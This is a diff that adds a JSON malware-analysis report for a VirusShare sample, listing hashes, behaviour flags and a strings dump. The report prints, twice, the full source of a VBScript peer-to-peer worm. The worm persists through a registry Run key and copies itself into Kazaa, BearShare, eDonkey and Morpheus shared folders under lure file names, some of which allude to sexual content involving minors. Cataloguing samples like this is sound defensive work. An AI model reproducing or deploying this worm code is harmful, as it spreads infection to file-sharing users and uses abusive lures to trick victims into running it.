@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Windows": "May enumerate application windows",
+            "copyfile": "May copy a file",
+            "createobject": "May create an OLE object",
+            "regread": "May read registry keys",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "On error Resume Next\nset shell = createobject(\"wscript.shell\")\nset fso = createobject(\"scripting.filesystemobject\")\nIkarus = wscript.scriptfullname\nfso.copyfile Ikarus,fso.getspecialfolder(2) & \"\\_uninst12.vbs\"\nshell.regwrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfaststart\",fso.getspecialfolder(2)& \"\\_uninst12.vbs\"\nPgdir = shell.regread(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ProgramFilesDir\")\nif day(now()) = 3 and month(now()) = 3 then\n msgbox \"03/03/03 exception error. Please reboot.\", vbCritical,\"Address violation at 030303x\"\nend if\nfiles = array(\"10 naked teens.jpg\",\"15yteenfuck.jpg\",\"Ad-Aware6.tar\",\"illegalsex.jpg\",\"kievgirl.jpg\",\"Young russian teens.jpg\",\"Bin Laden's Home.doc\",\"Kamasutra2003.doc\",\"Bush is crazy(and stupid).doc\",\"How To Rip DVDs.txt\",\"Eminem - I am your father.mp3\",\"Anton - Schwul oder was.mp3\")\nkl = (Pgdir & \"\\kazaa lite\\my shared folder\") & \"\\\"\nif fso.folderexists(kl) then\n for x=0 to 11\n  fso.copyfile Ikarus,kl & files(x) & \".vbs\"\n next\nend if\nkazaa = (Pgdir & \"\\kazaa\\my shared folder\") & \"\\\"\nif fso.folderexists(kazaa) then\n for x=0 to 11\n  fso.copyfile Ikarus,kl & files(x) & \".vbs\"\n next\nend if\nbearshare = (Pgdir & \"\\bearshare\\shared\") & \"\\\"\nif fso.folderexists(bearshare) then\n for x=0 to 11\n  fso.copyfile Ikarus,kl & files(x) & \".vbs\"\n next\nend if\nedonkey = (Pgdir & \"\\edonkey2000\\incoming\") & \"\\\"\nif fso.folderexists(edonkey) then\n for x=0 to 11\n  fso.copyfile Ikarus,kl & files(x) & \".vbs\"\n next\nend if\nmorpheus = (Pgdir & \"\\morpheus\\my shared folder\") & \"\\\"\nif fso.folderexists(morpheus) then\n for x=0 to 11\n  fso.copyfile Ikarus,kl & files(x) & \".vbs\"\n next\nend if\nrem Ikarus by SlageHammer"
+    },
+    "filename": "VirusShare_33b917adbf997c4088e3befae35c969b",
+    "filesize": 1731,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "33b917adbf997c4088e3befae35c969b",
+        "sha1": "7381caaba17160f2b0ad976fb44d252a1ca16d56",
+        "sha256": "a4946406324f2e6c4dd8a725349875b83a9aba2fea045983c7c0e2f55a720023"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On error Resume Next",
+            "set shell = createobject(\"wscript.shell\")",
+            "set fso = createobject(\"scripting.filesystemobject\")",
+            "Ikarus = wscript.scriptfullname",
+            "fso.copyfile Ikarus,fso.getspecialfolder(2) & \"\\_uninst12.vbs\"",
+            "shell.regwrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfaststart\",fso.getspecialfolder(2)& \"\\_uninst12.vbs\"",
+            "Pgdir = shell.regread(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ProgramFilesDir\")",
+            "if day(now()) = 3 and month(now()) = 3 then",
+            " msgbox \"03/03/03 exception error. Please reboot.\", vbCritical,\"Address violation at 030303x\"",
+            "end if",
+            "files = array(\"10 naked teens.jpg\",\"15yteenfuck.jpg\",\"Ad-Aware6.tar\",\"illegalsex.jpg\",\"kievgirl.jpg\",\"Young russian teens.jpg\",\"Bin Laden's Home.doc\",\"Kamasutra2003.doc\",\"Bush is crazy(and stupid).doc\",\"How To Rip DVDs.txt\",\"Eminem - I am your father.mp3\",\"Anton - Schwul oder was.mp3\")",
+            "kl = (Pgdir & \"\\kazaa lite\\my shared folder\") & \"\\\"",
+            "if fso.folderexists(kl) then",
+            " for x=0 to 11",
+            "  fso.copyfile Ikarus,kl & files(x) & \".vbs\"",
+            " next",
+            "end if",
+            "kazaa = (Pgdir & \"\\kazaa\\my shared folder\") & \"\\\"",
+            "if fso.folderexists(kazaa) then",
+            " for x=0 to 11",
+            "  fso.copyfile Ikarus,kl & files(x) & \".vbs\"",
+            " next",
+            "end if",
+            "bearshare = (Pgdir & \"\\bearshare\\shared\") & \"\\\"",
+            "if fso.folderexists(bearshare) then",
+            " for x=0 to 11",
+            "  fso.copyfile Ikarus,kl & files(x) & \".vbs\"",
+            " next",
+            "end if",
+            "edonkey = (Pgdir & \"\\edonkey2000\\incoming\") & \"\\\"",
+            "if fso.folderexists(edonkey) then",
+            " for x=0 to 11",
+            "  fso.copyfile Ikarus,kl & files(x) & \".vbs\"",
+            " next",
+            "end if",
+            "morpheus = (Pgdir & \"\\morpheus\\my shared folder\") & \"\\\"",
+            "if fso.folderexists(morpheus) then",
+            " for x=0 to 11",
+            "  fso.copyfile Ikarus,kl & files(x) & \".vbs\"",
+            " next",
+            "end if",
+            "rem Ikarus by SlageHammer"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.305241",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
